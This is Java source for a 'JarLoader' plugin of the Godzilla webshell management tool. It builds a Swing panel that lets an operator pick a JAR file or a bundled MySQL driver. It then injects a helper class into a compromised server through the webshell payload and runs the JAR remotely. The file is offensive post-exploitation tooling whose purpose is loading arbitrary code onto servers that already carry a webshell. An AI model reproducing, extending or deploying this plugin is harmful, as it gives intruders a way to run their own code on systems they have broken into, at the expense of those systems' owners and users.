package net.BeichenDream.Godzilla.shells.plugins.java;

import net.BeichenDream.Godzilla.core.Encoding;
import net.BeichenDream.Godzilla.core.annotation.PluginAnnotation;
import net.BeichenDream.Godzilla.core.imp.Payload;
import net.BeichenDream.Godzilla.core.imp.Plugin;
import net.BeichenDream.Godzilla.core.shell.ShellEntity;
import net.BeichenDream.Godzilla.core.ui.component.GBC;
import java.awt.BorderLayout;
import java.awt.GridBagLayout;
import java.awt.event.ActionEvent;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import javax.swing.filechooser.FileNameExtensionFilter;
import net.BeichenDream.Godzilla.util.Log;
import net.BeichenDream.Godzilla.util.automaticBindClick;
import net.BeichenDream.Godzilla.util.functions;
import net.BeichenDream.Godzilla.util.http.ReqParameter;

@PluginAnnotation(Name = "JarLoader", payloadName = "JavaDynamicPayload")
public class JarLoader implements Plugin {
    private static final String CLASS_NAME = "plugin.JarLoader";
    private static final String[] DB_JARS = {"mysql"};
    private Encoding encoding;
    private JComboBox<String> jarComboBox = new JComboBox<>(DB_JARS);
    private JLabel jarFileLabel = new JLabel("JarFile: ");
    private JTextField jarTextField = new JTextField(30);
    private JButton loadDbJarButton = new JButton("LoadDbJar");
    private JButton loadJarButton = new JButton("LoadJar");
    private boolean loadState;
    private JSplitPane meterpreterSplitPane = new JSplitPane();
    private JPanel panel = new JPanel(new BorderLayout());
    private Payload payload;
    private JButton selectJarButton = new JButton("select Jar");
    private ShellEntity shellEntity;

    public JarLoader() {
        this.meterpreterSplitPane.setOrientation(0);
        this.meterpreterSplitPane.setDividerSize(0);
        JPanel TopPanel = new JPanel();
        TopPanel.add(this.jarFileLabel);
        TopPanel.add(this.jarTextField);
        TopPanel.add(this.selectJarButton);
        TopPanel.add(this.loadJarButton);
        JPanel bottomPanel = new JPanel(new GridBagLayout());
        GBC gbcJarCommbox = new GBC(0, 0).setInsets(5, -40, 0, 0);
        GBC gbcLoadDb = new GBC(0, 1).setInsets(5, -40, 0, 0);
        bottomPanel.add(this.jarComboBox, gbcJarCommbox);
        bottomPanel.add(this.loadDbJarButton, gbcLoadDb);
        this.meterpreterSplitPane.setTopComponent(TopPanel);
        this.meterpreterSplitPane.setBottomComponent(bottomPanel);
        this.panel.add(this.meterpreterSplitPane);
    }

    private void selectJarButtonClick(ActionEvent actionEvent) {
        JFileChooser chooser = new JFileChooser();
        chooser.setFileFilter(new FileNameExtensionFilter("*.jar", new String[]{"jar"}));
        chooser.setFileSelectionMode(0);
        chooser.showDialog(new JLabel(), "选择");
        File selectdFile = chooser.getSelectedFile();
        if (selectdFile != null) {
            this.jarTextField.setText(selectdFile.getAbsolutePath());
        } else {
            Log.log("用户取消选择.....", new Object[0]);
        }
    }

    private void loadJarButtonClick(ActionEvent actionEvent) {
        try {
            InputStream inputStream = new FileInputStream(new File(this.jarTextField.getText()));
            byte[] jarByteArray = functions.readInputStream(inputStream);
            inputStream.close();
            JOptionPane.showMessageDialog(this.panel, loadJar(jarByteArray), "提示", 1);
        } catch (Exception e) {
            Log.error(e);
            JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
        }
    }

    private void loadDbJarButtonClick(ActionEvent actionEvent) {
        try {
            InputStream inputStream = getClass().getResourceAsStream(String.format("assets/%s.jar", this.jarComboBox.getSelectedItem()));
            byte[] jarByteArray = functions.readInputStream(inputStream);
            inputStream.close();
            JOptionPane.showMessageDialog(this.panel, loadJar(jarByteArray), "提示", 1);
        } catch (Exception e) {
            Log.error(e);
            JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
        }
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = getClass().getResourceAsStream("assets/JarLoader.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success", new Object[0]);
                    return;
                }
                Log.log("Load fail", new Object[0]);
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    public String loadJar(byte[] jarByteArray) {
        load();
        ReqParameter praameter = new ReqParameter();
        praameter.add("jarByteArray", jarByteArray);
        String resultString = this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "run", praameter));
        Log.log(resultString, new Object[0]);
        return resultString;
    }

    @Override // core.imp.Plugin
    public void init(ShellEntity shellEntity2) {
        this.shellEntity = shellEntity2;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override // core.imp.Plugin
    public JPanel getView() {
        return this.panel;
    }
}
